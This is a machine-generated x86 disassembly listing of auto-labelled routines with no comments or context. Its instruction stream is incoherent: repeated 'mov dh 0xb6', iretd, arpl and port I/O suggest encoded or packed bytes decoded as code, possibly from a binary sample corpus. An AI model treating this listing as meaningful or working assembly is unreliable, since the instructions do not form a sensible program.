fstpnce st1
jg r-xdata
xlat
rcr cl 0x1
fxch st7
mov eax 0xab262631
mov [ 0xffffffffd9d9db5e ] eax
iretd
iretd
out 0x29 al
mov [ 0xffffffffd9d9d74a ] eax
sub_475156
mov eax [ 0xffffffffb6d9d9cc ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xcf
and ebp esi
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
sub [ edx - 0x26262f29 ] esp
iretd
sub_4751de
fstpnce st1
dec esi
fldenv [ esi ]
jne r-xdata
test esi 0xd9d9c254
sbb eax 0xa2292a63
inc ebx
sub al 0x26
fldenv [ es : ebx - 0x26 ]
lodsd [ esi ]
arpl dx bx
sbb eax 0xa429de63
pop ebx
fstpnce st1
iretd
into
sbb esi [ esi ]
movsd [ edi ] es : [ esi ]
loop r-xdata
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x76
iretd
scasd [ edi ]
pop edx
add dh [ edx ]
iretd
sub_47522a
cmp ecx edi
fstpnce st1
inc eax
scasd [ edi ]
jae r-xdata
stosd [ edi ]
jl r-xdata
jae r-xdata
xor al 0x26
stosd [ edi ]
into
pushad
and eax 0xf9cf2626
xor al 0x26
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
0xcaa7
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
mov [ 0xffffffffd9d9db5e ] eax
jbe r-xdata
inc edx
iretd
mov [ 0x26262c43 ] al
fldenv [ ebx - 0x26 ]
lodsd [ esi ]
arpl dx bx
sbb eax 0xa429de63
pop ebx
fstpnce st1
iretd
je r-xdata
xor ah [ eax + 0x54cef725 ]
retn 0xd9d9
fstpnce st1
fnstenv [ eax + 0x2626269e ]
mov [ 0xffffffff9aa3abe6 ] eax
fcomp st1
fldcw [ ecx ]
mov [ 0x262634c2 ] al
sub_475276
aam 0xf8
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
mov [ 0xffffffffd9d9db5e ] eax
jbe r-xdata
mov [ 0x26262c43 ] al
fldenv [ ebx - 0x26 ]
lodsd [ esi ]
arpl dx bx
sbb eax 0xa429de63
pop ebx
fstpnce st1
iretd
je r-xdata
xor ah [ eax + 0x54cef725 ]
retn 0xd9d9
fstpnce st1
fnstenv [ eax + 0x2626269e ]
mov [ 0xffffffff9aa3abe6 ] eax
fcomp st1
fldcw [ ecx ]
mov [ 0x262634c2 ] al
stosd [ edi ]
jae r-xdata
xor al 0x26
stosd [ edi ]
into
pushad
and eax 0xf9cf2626
xor al 0x26
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
0xcaa7
sub_4752c3
cmpsb [ esi ] [ edi ]
and al 0x26
jne r-xdata
inc eax
scasd [ edi ]
pop ebx
pushfd
dec esp
push ebx
jns r-xdata
dec esp
bound edx [ 0xffffffffae63abfd ]
jne r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0xffffffffd9d9c159 ] al
adc eax 0xf0cf66e6
loopne r-xdata
scasd [ edi ]
pop ebx
0xaf40d8ad 0x985b
lodsd [ esi ]
fxch st7
inc ecx
cmp al 0x26
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fnstenv [ ecx + 0x262626a2 ]
jne r-xdata
pop ebx
cwde
iretd
aam 0x7e
dec esp
fnstenv [ esi - 0x399c50c0 ]
iretd
jpo r-xdata
lahf
rcr ecx cl
fnstenv [ esi + 0x40e5adb6 ]
scasd [ edi ]
arpl sp dx
jle r-xdata
jne r-xdata
iretd
mov dh 0xb6
mov dh 0xb6
sub [ eax - 0x26263b1b ] ebp
iretd
push ebp
iretd
sub_475325
rcl al 0x1
fstpnce st1
fnstenv [ ecx + 0x262626be ]
pop ds
jne r-xdata
iretd
jpo r-xdata
lahf
rcr ecx cl
fnstenv [ esi + 0x40e5adb6 ]
scasd [ edi ]
arpl sp dx
jle r-xdata
mov dh 0xb6
mov dh 0xb6
sub [ eax - 0x26263b1b ] ebp
iretd
push ebp
iretd
sub_475333
mov edx 0xb6262632
mov dh 0x40
scasd [ edi ]
pop ebx
pushfd
dec esp
push ebx
jns r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0xffffffffd9d9c159 ] al
adc eax 0xf0cf66e6
loopne r-xdata
scasd [ edi ]
pop ebx
0xaf40d8ad 0x985b
lodsd [ esi ]
fxch st7
inc ecx
cmp al 0x26
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fnstenv [ ecx + 0x262626a2 ]
jne r-xdata
aam 0x7e
dec esp
fnstenv [ esi - 0x399c50c0 ]
iretd
jpo r-xdata
lahf
rcr ecx cl
fnstenv [ esi + 0x40e5adb6 ]
scasd [ edi ]
arpl sp dx
jle r-xdata
jne r-xdata
iretd
mov dh 0xb6
mov dh 0xb6
sub [ eax - 0x26263b1b ] ebp
iretd
push ebp
iretd
sub_475373
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0xffffffffd9d9c159 ] al
adc eax 0xf0cf66e6
loopne r-xdata
aam 0x7e
dec esp
push ebp
iretd
fnstenv [ esi - 0x399c50c0 ]
iretd
sub_4753e6
adc ecx ebp
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xaf
arpl dx dx
scasd [ edi ]
arpl dx bx
sahf
sub [ es : edi + ebp * 4 + 0x6bafda7b ] eax
shr [ edi + 0x63adde73 ] cl
fcmove st7
in al dx
das
mov dh 0x4c
and cl [ esi + 0x26 ]
push ss
fst [ es : ebx + 0x2a ]
dec esp
iretd
sub_475502
inc esp
in al 0xd9
fnstenv [ esi - 0x4949494a ]
dec esp
push ecx
inc eax
scasd [ edi ]
arpl dx ax
jle r-xdata
dec esp
push es
inc eax
scasd [ edi ]
arpl si dx
jle r-xdata
inc ebx
inc eax
scasd [ edi ]
arpl ax ax
jle r-xdata
imul ebp [ ebp + 0x70 ] 0xffffffcf
add ecx edi
dec edx
jmp 0xffffffffb6fe2f48
dec esp
dec eax
lodsd [ esi ]
out dx al
inc eax
scasd [ edi ]
imul ecx esi 0x7f
dec esp
inc ecx
inc eax
scasd [ edi ]
imul ecx esp 0x7f
dec esp
dec edi
iretd
fnstenv [ esi - 0x5454494a ]
je r-xdata
jo r-xdata
fstpnce st1
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
arpl si bx
adc eax 0x63af40e6
fsubr [ ebx - 0x26240d5d ]
fxch st6
pop esi
pop ebx
les edi [ ecx + 0x40 ]
scasd [ edi ]
pop ebx
into
dec esp
dec ebx
iretd
insd
jo r-xdata
sub esp [ esi ]
stosd [ edi ]
jae r-xdata
into
aaa
iretd
inc ebx
inc eax
scasd [ edi ]
arpl ax di
lodsd [ esi ]
loope r-xdata
mov esi 0xb6d9d9ff
mov dh 0xb6
mov dh 0x70
jbe r-xdata
mov dh 0x7e
stosb [ edi ]
fcmovnu st1
fxch st6
mov cl 0xfe
fstpnce st1
iretd
and eax 0xb6d9d9d8
mov dh 0xb6
stosd [ edi ]
stosd [ edi ]
sub_475609
sub al 0xd2
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x78
jge r-xdata
iretd
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
pop ebx
les edi [ ecx + 0x40 ]
scasd [ edi ]
pop ebx
into
dec esp
dec ebx
iretd
sub_475693
fstpnce st1
mov dh 0xd9
push edx
add bh [ esi ]
fnstenv [ eax + 0x52 ]
into
stosd [ edi ]
rcr cl cl
fldenv [ ebx + 0x21a329e6 ]
jne r-xdata
xor [ edx ] 0x26
mov dh 0xb6
mov dh 0x71
dec esp
and al 0x71
iretd
mov al 0x8a
scasd [ edi ]
jpe r-xdata
sbb eax esp
fstpnce st1
adc eax 0xe6a361d9
sub [ ebx - 0x2626671c ] esp
iretd
xor cl dh
sub_4756f5
cmp ebx esi
fdiv st0
fstpnce st1
mov dh 0xb6
sub [ ebx - 0x262614af ] esp
js r-xdata
stosd [ edi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
mov dh 0xb6
mov dh 0xb6
jo r-xdata
iretd
iretd
jne r-xdata
mov dh 0xb6
into
loop r-xdata
pop ds
sub [ cs : ebx + 0x26262444 ] esp
iretd
xor [ edx ] 0x26
mov dh 0xb6
mov dh 0x71
dec esp
and al 0x71
iretd
mov al 0x8a
scasd [ edi ]
jpe r-xdata
leave
fstpnce st1
mov dh 0xb6
mov dh 0xb6
dec esi
push ss
fst [ es : eax + 0x76 ]
fst [ eax + 0x12 ]
fst [ ebx - 0x3e ]
fnstenv [ ecx + 0x6 ]
scasd [ edi ]
arpl dx bx
pop ds
jpo r-xdata
fstpnce st1
jbe r-xdata
sbb eax esp
fstpnce st1
adc eax 0xe6a361d9
sub [ ebx - 0x2626671c ] esp
iretd
xor cl dh
fstpnce st1
jle r-xdata
test eax 0x15d9d9e9
out 0x40 al
scasd [ edi ]
jpo r-xdata
inc edi
int1
fstpnce st1
jg r-xdata
mov dh 0xce
inc eax
scasd [ edi ]
arpl sp si
adc eax 0xf263abfd
inc eax
scasd [ edi ]
push ebx
call 0x4075aafe
scasd [ edi ]
jpo r-xdata
iretd
lodsd [ esi ]
cld
jbe r-xdata
loopne r-xdata
dec esi
mul [ ecx ]
iretd
scasd [ edi ]
jpo r-xdata
fstpnce st1
mov dh 0x29
mov [ 0xffffffffd9d9df9e ] al
dec esp
and cl bh
fcomip st4
iretd
sub_475729
cmp [ 0xffffffffb6b62626 ] ch
leave
fstpnce st1
mov dh 0xb6
mov dh 0xb6
dec esi
push ss
fst [ es : eax + 0x76 ]
fst [ eax + 0x12 ]
fst [ ebx - 0x3e ]
fnstenv [ ecx + 0x6 ]
scasd [ edi ]
arpl dx bx
pop ds
jpo r-xdata
fstpnce st1
jbe r-xdata
iretd
iretd
fstpnce st1
jle r-xdata
test eax 0x15d9d9e9
out 0x40 al
scasd [ edi ]
jpo r-xdata
fdiv st0
fstpnce st1
mov dh 0xb6
sub [ ebx - 0x262614af ] esp
js r-xdata
stosd [ edi ]
mov dh 0xce
inc eax
scasd [ edi ]
arpl sp si
adc eax 0xf263abfd
inc eax
scasd [ edi ]
push ebx
call 0x4075aafe
scasd [ edi ]
jpo r-xdata
inc edi
int1
fstpnce st1
jg r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
mov dh 0xb6
mov dh 0xb6
jo r-xdata
jne r-xdata
iretd
lodsd [ esi ]
cld
jbe r-xdata
into
loop r-xdata
mov dh 0xb6
pop ds
sub [ cs : ebx + 0x26262444 ] esp
iretd
xor [ edx ] 0x26
mov dh 0xb6
mov dh 0x71
dec esp
and al 0x71
iretd
mov al 0x8a
scasd [ edi ]
jpe r-xdata
loopne r-xdata
sbb eax esp
fstpnce st1
adc eax 0xe6a361d9
sub [ ebx - 0x2626671c ] esp
iretd
xor cl dh
dec esi
mul [ ecx ]
iretd
scasd [ edi ]
jpo r-xdata
fstpnce st1
mov dh 0x29
mov [ 0xffffffffd9d9df9e ] al
dec esp
and cl bh
fcomip st4
iretd
sub_47576c
and [ esi ] esp
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x4c
push edx
inc eax
scasd [ edi ]
arpl ax ax
jle r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
scasd [ edi ]
arpl si cx
adc eax 0x63af40e6
int3
jpo r-xdata
lodsd [ esi ]
cld
iretd
iretd
lodsd [ esi ]
cld
jbe r-xdata
fstpnce st1
jle r-xdata
loopne r-xdata
fdiv st0
fstpnce st1
mov dh 0xb6
sub [ ebx - 0x262614af ] esp
js r-xdata
stosd [ edi ]
dec esi
mul [ ecx ]
iretd
scasd [ edi ]
jpo r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
mov dh 0xb6
mov dh 0xb6
jo r-xdata
iretd
iretd
fstpnce st1
mov dh 0x29
mov [ 0xffffffffd9d9df9e ] al
dec esp
and cl bh
fcomip st4
iretd
jne r-xdata
mov dh 0xb6
into
loop r-xdata
pop ds
sub [ cs : ebx + 0x26262444 ] esp
iretd
xor [ edx ] 0x26
mov dh 0xb6
mov dh 0x71
dec esp
and al 0x71
iretd
mov al 0x8a
scasd [ edi ]
jpe r-xdata
leave
fstpnce st1
mov dh 0xb6
mov dh 0xb6
dec esi
push ss
fst [ es : eax + 0x76 ]
fst [ eax + 0x12 ]
fst [ ebx - 0x3e ]
fnstenv [ ecx + 0x6 ]
scasd [ edi ]
arpl dx bx
pop ds
jpo r-xdata
fstpnce st1
jbe r-xdata
sbb eax esp
fstpnce st1
adc eax 0xe6a361d9
sub [ ebx - 0x2626671c ] esp
iretd
xor cl dh
test eax 0x15d9d9e9
out 0x40 al
scasd [ edi ]
jpo r-xdata
inc edi
int1
fstpnce st1
jg r-xdata
mov dh 0xce
inc eax
scasd [ edi ]
arpl sp si
adc eax 0xf263abfd
inc eax
scasd [ edi ]
push ebx
call 0x4075aafe
scasd [ edi ]
sub_4757ba
sar ebx cl
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
jpo r-xdata
lodsd [ esi ]
cld
iretd
iretd
lodsd [ esi ]
cld
jbe r-xdata
fstpnce st1
jle r-xdata
loopne r-xdata
fdiv st0
fstpnce st1
mov dh 0xb6
sub [ ebx - 0x262614af ] esp
js r-xdata
stosd [ edi ]
dec esi
mul [ ecx ]
iretd
scasd [ edi ]
jpo r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
mov dh 0xb6
mov dh 0xb6
jo r-xdata
iretd
iretd
fstpnce st1
mov dh 0x29
mov [ 0xffffffffd9d9df9e ] al
dec esp
and cl bh
fcomip st4
iretd
jne r-xdata
mov dh 0xb6
into
loop r-xdata
pop ds
sub [ cs : ebx + 0x26262444 ] esp
iretd
xor [ edx ] 0x26
mov dh 0xb6
mov dh 0x71
dec esp
and al 0x71
iretd
mov al 0x8a
scasd [ edi ]
jpe r-xdata
leave
fstpnce st1
mov dh 0xb6
mov dh 0xb6
dec esi
push ss
fst [ es : eax + 0x76 ]
fst [ eax + 0x12 ]
fst [ ebx - 0x3e ]
fnstenv [ ecx + 0x6 ]
scasd [ edi ]
arpl dx bx
pop ds
jpo r-xdata
fstpnce st1
jbe r-xdata
sbb eax esp
fstpnce st1
adc eax 0xe6a361d9
sub [ ebx - 0x2626671c ] esp
iretd
xor cl dh
test eax 0x15d9d9e9
out 0x40 al
scasd [ edi ]
jpo r-xdata
inc edi
int1
fstpnce st1
jg r-xdata
mov dh 0xce
inc eax
scasd [ edi ]
arpl sp si
adc eax 0xf263abfd
inc eax
scasd [ edi ]
push ebx
call 0x4075aafe
scasd [ edi ]
sub_4757d1
aam 0xda
fstpnce st1
mov dh 0xb6
mov dh 0x7c
dec esp
inc esp
inc eax
scasd [ edi ]
jae r-xdata
mov dh 0xb6
jl r-xdata
scasd [ edi ]
push ebx
dec esi
iretd
cmp ch [ edx ]
mov dh 0xb6
xor ah [ esi ]
scasd [ edi ]
jae r-xdata
mov dh 0xb6
dec esp
inc ecx
jl r-xdata
mov dh 0x71
jne r-xdata
scasd [ edi ]
arpl [ eax + 0x40 ] cx
scasd [ edi ]
jae r-xdata
lodsd [ esi ]
imul esi [ edx ] 0xffffffce
cmp ebp [ 0x63ab2626 ]
iretd
mov dh 0xb6
lodsd [ esi ]
not [ 0x63af40e6 ]
push esi
stosd [ edi ]
arpl [ edx ] si
inc eax
sub_475820
pushfd
xor ah [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0x71
jne r-xdata
scasd [ edi ]
push ebx
dec esi
iretd
cmp ch [ edx ]
mov dh 0xb6
lodsd [ esi ]
imul esi [ edx ] 0xffffffce
cmp ebp [ 0x63ab2626 ]
iretd
sub_475871
fwait
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
jae r-xdata
dec esp
stosd [ edi ]
bound eax [ edx ]
sbb dh [ ecx + 0x76 ]
iretd
arpl [ eax ] di
jle r-xdata
dec esp
inc esp
jl r-xdata
mov dh 0xb6
mov dh 0xb6
or [ eax + 0x4c ] bh
inc eax
scasd [ edi ]
jpo r-xdata
scasd [ edi ]
jae r-xdata
arpl [ esi ] ax
lodsd [ esi ]
loopne r-xdata
mov [ 0xffffffffd9d9dd72 ] eax
jbe r-xdata
arpl dx si
jbe r-xdata
mov dh 0xb6
scasd [ edi ]
arpl [ esi + edi * 2 ] ax
dec esp
pop esi
lodsd [ esi ]
out dx al
jge r-xdata
js r-xdata
dec esp
inc ecx
iretd
fidivr [ ebp + 0x40 ]
or [ 0xffffffffb6b62626 ] esp
mov dh 0xb6
dec esi
push ss
fst [ es : eax + 0x76 ]
jne r-xdata
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
mov cl 0xa6
fst [ es : eax + 0x76 ]
scasd [ edi ]
arpl dx dx
jne r-xdata
scasd [ edi ]
jpo r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
inc ebx
inc eax
scasd [ edi ]
inc eax
scasd [ edi ]
imul eax [ edx ] 0x7f
dec esp
push esp
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
dec esp
inc ebp
iretd
mov dh 0xb6
adc eax 0x7baf40fd
or al 0xad
stc
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
out 0xc2 eax
fstpnce st1
mov dh 0x29
xchg ecx eax
aaa
iretd
sub_47589d
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
jae r-xdata
arpl [ eax ] di
jle r-xdata
dec esp
inc esp
jl r-xdata
mov dh 0xb6
mov dh 0xb6
or [ eax + 0x4c ] bh
inc eax
scasd [ edi ]
jpo r-xdata
scasd [ edi ]
jae r-xdata
arpl [ esi ] ax
lodsd [ esi ]
loopne r-xdata
mov [ 0xffffffffd9d9dd72 ] eax
jbe r-xdata
arpl dx si
jbe r-xdata
mov dh 0xb6
scasd [ edi ]
arpl [ esi + edi * 2 ] ax
dec esp
pop esi
lodsd [ esi ]
out dx al
jge r-xdata
js r-xdata
dec esp
inc ecx
iretd
fidivr [ ebp + 0x40 ]
or [ 0xffffffffb6b62626 ] esp
mov dh 0xb6
dec esi
push ss
fst [ es : eax + 0x76 ]
jne r-xdata
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
mov cl 0xa6
fst [ es : eax + 0x76 ]
scasd [ edi ]
arpl dx dx
jne r-xdata
scasd [ edi ]
jpo r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
inc ebx
inc eax
scasd [ edi ]
inc eax
scasd [ edi ]
imul eax [ edx ] 0x7f
dec esp
push esp
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
dec esp
inc ebp
iretd
mov dh 0xb6
adc eax 0x7baf40fd
or al 0xad
stc
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
out 0xc2 eax
fstpnce st1
mov dh 0x29
xchg ecx eax
aaa
iretd
sub_4758f9
cld
in eax 0xd9
fnstenv [ esi - 0x3049494a ]
adc ah dl
fstpnce st1
mov dh 0xef
in eax 0xb6
arpl [ esi ] ax
lodsd [ esi ]
loopne r-xdata
mov [ 0xffffffffd9d9dd72 ] eax
jbe r-xdata
mov dh 0xb6
scasd [ edi ]
arpl [ esi + edi * 2 ] ax
dec esp
fidivr [ ebp + 0x40 ]
or [ 0xffffffffb6b62626 ] esp
mov dh 0xb6
dec esi
push ss
fst [ es : eax + 0x76 ]
jne r-xdata
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
inc eax
scasd [ edi ]
imul eax [ edx ] 0x7f
dec esp
push esp
lodsd [ esi ]
inc [ eax - 0x51 ]
jpo r-xdata
dec esp
inc ebp
iretd
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
mov cl 0xa6
fst [ es : eax + 0x76 ]
scasd [ edi ]
arpl dx dx
jne r-xdata
scasd [ edi ]
jpo r-xdata
adc eax 0x7baf40fd
or al 0xad
stc
inc eax
scasd [ edi ]
jpo r-xdata
arpl dx si
jbe r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
stosd [ edi ]
out 0xc2 eax
fstpnce st1
mov dh 0x29
xchg ecx eax
aaa
iretd
pop esi
lodsd [ esi ]
out dx al
jge r-xdata
sub_4759c3
fstpnce st1
mov [ 0x7a229e6 ] eax
int 0xd9
fxch st7
jae r-xdata
mov dh 0xb6
dec esi
cmpsd [ esi ] [ edi ]
pop ebp
sbb eax [ 0xffffffffd99be4cf ]
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xac
mov [ cs : 0xffffffffcce1cfef ] al
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
sub dh [ eax ]
movsd [ edi ] [ esi ]
in al 0x24
iretd
into
insb
0xd9d9
sub_4759ec
test al 0x34
mov dh 0xb6
mov dh 0x4e
cmpsd [ esi ] [ edi ]
pop ebp
sbb eax [ 0xffffffffd99be4cf ]
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xac
mov [ cs : 0xffffffffcce1cfef ] al
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
sub dh [ eax ]
movsd [ edi ] [ esi ]
in al 0x24
iretd
sub_475a90
outsd
dec esp
inc edx
jno r-xdata
lodsd [ esi ]
bound eax [ edx ]
push cs
into
adc al 0xfd
fstpnce st1
jg r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jno r-xdata
mov al 0x96
jne r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x15
out dx eax
inc eax
scasd [ edi ]
imul ebx eax 0x7f
dec esp
inc edx
inc eax
scasd [ edi ]
imul esi esi 0x7f
iretd
dec esi
cmpsb [ es : esi ] [ edi ]
dec esp
fst [ es : edx + 0x2 ]
push cs
fnstenv [ eax + 0x52 ]
lodsd [ esi ]
bound eax [ edx ]
iretd
add eax 0x78262632
out dx eax
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
loopne r-xdata
jae r-xdata
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0x71
iretd
leave
fnstcw [ edi + 0x7f ]
mov ah [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fldenv [ ebx - 0x26 ]
movsd [ edi ] [ esi ]
pop ebx
fisub [ 0xffffffffd9c83dcf ]
mov dh 0x25
loope r-xdata
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xce
pushfd
std
fstpnce st1
iretd
sub_475b1b
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
adc eax 0x6baf40ef
fdivr [ edi + 0x4c ]
inc edx
inc eax
scasd [ edi ]
imul esi esi 0x7f
iretd
sub_475c22
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
and eax 0x6d98964e
stosb [ edi ]
iretd
mov [ 0x1da229e6 ] eax
sub [ esi ] esp
dec esp
fnstenv [ esi - 0x31 ]
cmp [ ecx ] ch
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
test [ eax - 0x51 ] 0x73
sub_475c45
push es
inc eax
scasd [ edi ]
jae r-xdata
lodsd [ esi ]
test edi 0xd9d9df95
mov dh 0xb6
mov dh 0xd9
mov cl 0xce
movsd [ edi ] es : [ esi ]
loop r-xdata
aad 0x26
mov dh 0xb6
stosd [ edi ]
arpl si sp
jbe r-xdata
inc eax
scasd [ edi ]
jae r-xdata
daa
jo r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
bound esi [ esi ]
test bh 0x72
popfd
fstpnce st1
mov dh 0x29
xchg ecx eax
cmp edi ecx
pushfd
daa
mov dh 0xad
sbb ah [ di ]
out 0x29 eax
mov [ 0xffffffffd9d9f256 ] al
iretd
sub [ ecx - 0x2a309ade ] edx
mov dh 0xb6
lodsd [ esi ]
fiadd [ eax - 0x51 ]
pop ebx
salc
lodsd [ esi ]
test bh 0x62
daa
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
arpl dx bx
sbb al 0xad
and eax 0x6d98964e
stosb [ edi ]
iretd
sub_475d0d
neg ecx
fldcw [ ecx ]
xchg ecx eax
aaa
jne r-xdata
out 0x29 al
mov [ 0x262627e7 ] eax
stosd [ edi ]
arpl dx di
jbe r-xdata
lodsd [ esi ]
out 0xcf eax
hlt
stosd [ edi ]
loopne r-xdata
lodsd [ esi ]
fstpnce st1
push ebx
salc
iretd
dec esp
cmp [ ecx + ebx * 8 - 0x51 ] cl
pop ebx
fmulp st7
adc ch al
fstpnce st1
mov dh 0xb6
jne r-xdata
mov fs [ edi ]
mov dh 0xb6
mov dh 0x29
mov [ 0xffffffffd9d9ce9c ] al
iretd
mov dh 0xb6
mov dh 0xb6
scasd [ edi ]
arpl dx ax
lodsd [ esi ]
arpl si bx
scasd [ edi ]
arpl si cx
lodsd [ esi ]
arpl dx dx
scasd [ edi ]
arpl dx cx
adc eax 0xd263afe6
iretd
fnstenv [ eax + 0x2626268a ]
stosd [ edi ]
mov dh 0xb6
into
stosd [ edi ]
jmp 0xffffffffa517372f
arpl bx cx
fstpnce st1
jg r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xa5
loop r-xdata
arpl [ edx + 0x76 ] sp
lodsd [ esi ]
loopne r-xdata
dec esp
fldcw [ edi + 0x10cfde5b ]
vpsubusw xmm6 xmm4 [ esi - 0x269e8a4a ]
mov al 0x8a
stosd [ edi ]
arpl si bp
jbe r-xdata
mov [ 0xffffffffb7a229e6 ] eax
sti
fstpnce st1
dec esi
stosd [ edi ]
sub_475d24
lds esp [ 0xffffffffb6b62626 ]
dec esp
fldcw [ edi + 0x10cfde5b ]
vpsubusw xmm6 xmm4 [ esi - 0x269e8a4a ]
mov al 0x8a
stosd [ edi ]
mov [ 0xffffffffb7a229e6 ] eax
sti
fstpnce st1
dec esi
stosd [ edi ]
mov dh 0xb6
into
stosd [ edi ]
jmp 0xffffffffa517372f
arpl bx cx
fstpnce st1
jg r-xdata
lodsd [ esi ]
fstpnce st1
push ebx
salc
iretd
mov dh 0xb6
mov dh 0xb6
mov dh 0xa5
loop r-xdata
mov dh 0xb6
out 0x29 al
mov [ 0x262627e7 ] eax
stosd [ edi ]
arpl dx di
jbe r-xdata
dec esp
cmp [ ecx + ebx * 8 - 0x51 ] cl
pop ebx
fmulp st7
adc ch al
fstpnce st1
mov dh 0xb6
jne r-xdata
mov fs [ edi ]
mov dh 0xb6
mov dh 0x29
mov [ 0xffffffffd9d9ce9c ] al
iretd
arpl si bp
jbe r-xdata
stosd [ edi ]
loopne r-xdata
mov dh 0xb6
mov dh 0xb6
scasd [ edi ]
arpl dx ax
lodsd [ esi ]
arpl si bx
scasd [ edi ]
arpl si cx
lodsd [ esi ]
arpl dx dx
scasd [ edi ]
arpl dx cx
adc eax 0xd263afe6
iretd
arpl [ edx + 0x76 ] sp
lodsd [ esi ]
loopne r-xdata
fnstenv [ eax + 0x2626268a ]
stosd [ edi ]
sub_475edb
push esp
into
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0xffffffffd9d9f0b0 ] al
cmpsd [ gs : esi ] [ edi ]
loope r-xdata
push edx
add ch [ edx ]
dec esp
dec esi
dec esp
and eax 0xd9c60dcf
fxch st7
sub eax 0xb6d9d9ea
mov dh 0xb6
mov dh 0xad
aam 0xd
jmp 0x266b2381
sbb eax 0xe8e2cff8
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
sub [ edx - 0x2626021b ] esp
iretd
sub_476138
sbb ah ah
fstpnce st1
mov dh 0xb6
mov dh 0x15
out 0xcf al
xor ebx eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
adc eax 0x9ef3cfe6
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xe1
arpl di dx
dec esp
dec esp
loope r-xdata
